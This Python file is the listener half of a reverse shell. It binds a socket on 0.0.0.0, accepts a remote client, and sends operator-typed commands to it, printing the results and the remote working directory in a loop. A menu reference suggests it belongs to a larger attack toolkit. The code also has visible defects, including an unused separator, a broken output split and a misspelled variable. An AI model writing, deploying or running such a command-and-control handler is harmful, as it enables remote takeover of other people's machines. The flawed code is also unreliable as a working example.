import socket, os
from colorama import *
from time import sleep
from os import system, getenv, name
from usefull import *
## set the clear command by os name
windows = False
if name == 'nt': ## windows
    def clear():
        widows = True
        system('cls')
else: ## linux distrib.
    def clear():
        system('clear')




## init colorama to dodge the problems
init()

class Server:
    def start(self, port, SERVER_HOST="0.0.0.0"):

        print(f"{info}Server started")

        BUFFER_SIZE = 1024 * 128
        SEPARATOR = "<sep>"

        s = socket.socket()
        s.bind((SERVER_HOST, int(port)))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen(5)
        print(f"{success}Listening  on  {magenta}{SERVER_HOST}:{port}{reset}")
        client_socket, client_address = s.accept()
        print(f"{success}{cyan}{client_address[0]}:{client_address[1]} Connected")
        currentWorkingDirectory = client_socket.recv(BUFFER_SIZE).decode()
        while True:

            cmd = input(f"{cyan}{currentWorkingDirectory} $> ")

            if not cmd.strip():
                continue
            client_socket.send(cmd.encode())
            if cmd.lower() == "exit":
                break
            output = client_socket.recv(BUFFER_SIZE).decode()
            print(f"{cyan}---> {magenta}{output}{reset}")
            results, currentWorkingDirectory = output.split()

            print(results)

        client_socket.close()
        print(f"{attention}Client connection closed")
        s.close()
        print(f"{attention}Server closed")
        print(f"{info}Go back to menu...")
        sleep(3)
